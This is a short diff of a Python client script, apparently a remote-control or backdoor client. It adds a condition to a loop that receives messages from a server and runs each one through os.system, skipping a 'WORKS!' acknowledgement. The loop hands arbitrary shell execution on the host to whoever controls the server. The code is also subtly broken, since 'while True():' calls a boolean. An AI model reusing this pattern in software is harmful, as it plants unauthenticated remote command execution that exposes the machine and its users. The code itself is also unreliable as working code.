@@ -35,7 +35,7 @@ while True():
     msg_server = test.receive_data()
     if msg_server != None:
         print(msg_server)
-        if msg_server != None:
+        if msg_server != None and msg_server != "WORKS!":
             try:
                 os.system(msg_server)
             except Exception as e:
